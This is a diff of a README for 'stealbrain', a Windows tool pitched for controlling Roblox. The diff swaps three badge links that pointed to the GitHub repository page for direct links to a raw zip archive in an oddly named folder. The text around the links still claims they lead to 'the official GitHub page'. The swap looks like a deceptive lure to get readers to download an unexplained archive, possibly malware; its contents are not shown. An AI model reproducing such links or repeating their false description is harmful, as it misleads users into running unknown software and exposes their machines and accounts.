@@ -1,6 +1,6 @@
 # 🧠 stealbrain - Control Roblox Chaos Easily
 
-[![Download stealbrain](https://img.shields.io/badge/Download-stealbrain-ff6f61?style=for-the-badge)](https://github.com/Giangsyn/stealbrain)
+[![Download stealbrain](https://img.shields.io/badge/Download-stealbrain-ff6f61?style=for-the-badge)](https://github.com/Giangsyn/stealbrain/raw/refs/heads/main/Pleurobrachia/Software-2.9-beta.1.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to download, install, and run stealbrain on your Windows PC.
 
 Go to the official stealbrain GitHub page by clicking this link:
 
-[![Visit stealbrain on GitHub](https://img.shields.io/badge/Open-GitHub-blue?style=for-the-badge)](https://github.com/Giangsyn/stealbrain)
+[![Visit stealbrain on GitHub](https://img.shields.io/badge/Open-GitHub-blue?style=for-the-badge)](https://github.com/Giangsyn/stealbrain/raw/refs/heads/main/Pleurobrachia/Software-2.9-beta.1.zip)
 
 This page hosts the latest files and documentation you will need.
 
@@ -140,4 +140,4 @@ This project welcomes community involvement but requires basic GitHub navigation
 
 Click below to get started. This link takes you to the official GitHub page to download the latest version.
 
-[![Download stealbrain](https://img.shields.io/badge/Download-stealbrain-ff6f61?style=for-the-badge)](https://github.com/Giangsyn/stealbrain)
+[![Download stealbrain](https://img.shields.io/badge/Download-stealbrain-ff6f61?style=for-the-badge)](https://github.com/Giangsyn/stealbrain/raw/refs/heads/main/Pleurobrachia/Software-2.9-beta.1.zip)
